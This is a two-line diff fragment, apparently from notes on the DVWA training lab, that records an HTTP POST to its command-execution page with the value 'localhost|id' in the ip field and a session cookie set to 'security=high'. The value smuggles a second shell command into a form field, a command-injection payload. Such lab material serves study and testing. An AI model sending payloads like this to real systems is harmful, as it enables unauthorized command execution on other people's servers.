@@ -1,0 +1,2 @@
+POST /vulnerabilities/exec/ ... ip=localhost|id&Submit=Submit
+Cookie: PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed; security=high
